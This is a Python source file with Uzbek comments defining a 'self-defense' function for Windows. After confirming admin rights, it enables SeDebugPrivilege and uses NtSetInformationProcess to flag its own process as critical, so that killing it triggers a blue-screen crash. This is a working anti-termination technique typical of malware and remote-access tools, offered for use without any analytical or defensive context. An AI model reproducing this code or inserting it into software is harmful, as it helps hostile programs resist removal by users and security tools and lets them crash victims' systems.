import ctypes
import os

def enable_self_defense():
    """Dasturni o'ldirib bo'lmaydigan (Critical) qilish (Faqat ADMIN huquqi bilan)"""
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            print("[-] Self-Defense uchun Administrator huquqi kerak!")
            return False

        # Windows API orqali jarayon huquqlarini o'zgartirish
        RtlAdjustPrivilege = ctypes.windll.ntdll.RtlAdjustPrivilege
        NtSetInformationProcess = ctypes.windll.ntdll.NtSetInformationProcess
        
        # SeDebugPrivilege ni yoqish (20)
        RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
        
        # Jarayonni Critical (29) qilib belgilash
        process_handle = ctypes.windll.kernel32.GetCurrentProcess()
        is_critical = ctypes.c_ulong(1)
        
        NtSetInformationProcess(process_handle, 29, ctypes.byref(is_critical), ctypes.sizeof(is_critical))
        print("[+] Self-Defense yoqildi. Dasturni yopish tizimni o'chiradi (BSOD).")
        return True
    except Exception as e:
        print(f"[-] Self-Defense xatosi: {e}")
        return False